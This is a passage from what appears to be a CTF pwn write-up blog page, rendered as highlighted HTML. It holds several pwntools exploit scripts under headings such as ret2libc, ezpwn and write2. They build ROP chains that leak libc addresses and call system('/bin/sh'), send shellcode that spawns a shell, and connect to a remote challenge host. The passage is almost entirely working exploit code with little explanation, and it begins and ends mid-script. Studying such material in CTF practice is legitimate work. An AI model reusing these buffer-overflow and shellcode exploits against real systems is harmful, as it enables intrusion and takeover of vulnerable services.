punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>lic \t<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> lenth              <span class=\"token punctuation\">:</span><span class=\"token string\">b'Yhuan'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth<span class=\"token operator\">//</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'Y'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">################</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\"># s</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\"># 41</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\"># -01</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\"># 13 -> 12</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\"># 40</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\"># -28</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\"># 4d ->25</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token comment\"># -1</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token comment\">################</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">payload</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\tsl<span class=\"token punctuation\">(</span><span class=\"token string\">'s'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\tsl<span class=\"token punctuation\">(</span><span class=\"token string\">'41'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\tsl<span class=\"token punctuation\">(</span><span class=\"token string\">'-1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\tsl<span class=\"token punctuation\">(</span><span class=\"token string\">'40'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\tsl<span class=\"token punctuation\">(</span><span class=\"token string\">'-28'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\tsl<span class=\"token punctuation\">(</span><span class=\"token string\">'-1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>payload<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"ret2libc\"><a class=\"markdownIt-Anchor\" href=\"#ret2libc\">#</a> ret2libc</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'pwn.node.game.sycsec.com'</span><span class=\"token punctuation\">,</span><span class=\"token number\">30680</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># r = gdb.debug('./chal')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># r = process('./chal')</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./chal'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>lic \t<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span>p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> lenth              <span class=\"token punctuation\">:</span><span class=\"token string\">b'Yhuan'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth<span class=\"token operator\">//</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'Y'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>rdi_ret <span class=\"token operator\">=</span><span class=\"token number\">0x0000000000401333</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>rsi_r15_ret <span class=\"token operator\">=</span><span class=\"token number\">0x0000000000401331</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>ret <span class=\"token operator\">=</span> <span class=\"token number\">0x000000000040101a</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>write_got<span class=\"token operator\">=</span>elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'write'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>write_plt<span class=\"token operator\">=</span>elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'write'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">b'try this\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">b'This challenge no backdoor!'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>gadget_1 <span class=\"token operator\">=</span> <span class=\"token number\">0x40132A</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>gadget_2 <span class=\"token operator\">=</span> <span class=\"token number\">0x401310</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'\\0'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>gadget_1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># rbx</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># rbp</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># r12</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>write_got<span class=\"token punctuation\">)</span> <span class=\"token comment\"># r13</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># r14</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>write_got<span class=\"token punctuation\">)</span> <span class=\"token comment\"># r15</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>gadget_2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>payload <span class=\"token operator\">+=</span> <span class=\"token string\">b'\\0'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x8</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token operator\">*</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x04010D0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>write <span class=\"token operator\">=</span> lic<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\x7f'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>write<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>libc <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'write'</span><span class=\"token punctuation\">,</span>write<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>base <span class=\"token operator\">=</span> write <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'write'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>system <span class=\"token operator\">=</span> base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>binsh <span class=\"token operator\">=</span> base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'str_bin_sh'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>payload2 <span class=\"token operator\">=</span> <span class=\"token string\">b'\\0'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rdi_ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>sl<span class=\"token punctuation\">(</span>payload2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"ezpwn\"><a class=\"markdownIt-Anchor\" href=\"#ezpwn\">#</a> ezpwn</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># from LibcSearcher import*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># r = remote(\"pwn.node.game.sycsec.com\",31041)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># r = gdb.debug('./pwn')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"># libc = ELF('/home/h711/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># ld-linux-x86-64.so.2</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #设置种子</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>lic \t<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span>p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> lenth              <span class=\"token punctuation\">:</span><span class=\"token string\">b'Yhuan'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth<span class=\"token operator\">//</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'F'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>shellcode <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\txor rax,rax</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\tmov dx,0x100</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\tsyscall</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>'''</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>paylaod <span class=\"token operator\">=</span><span class=\"token string\">b'/bin/sh\\x00'</span> <span class=\"token operator\">+</span> shellcode</pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>paylaod<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>se<span class=\"token punctuation\">(</span>paylaod<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token comment\"># gdb.attach(r)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>shellcode <span class=\"token operator\">=</span> <span class=\"token string\">b'\\x90'</span><span class=\"token operator\">*</span><span class=\"token number\">9</span><span class=\"token operator\">+</span>asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>se<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"write2\"><a class=\"markdownIt-Anchor\" href=\"#write2\">#</a> write2</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td 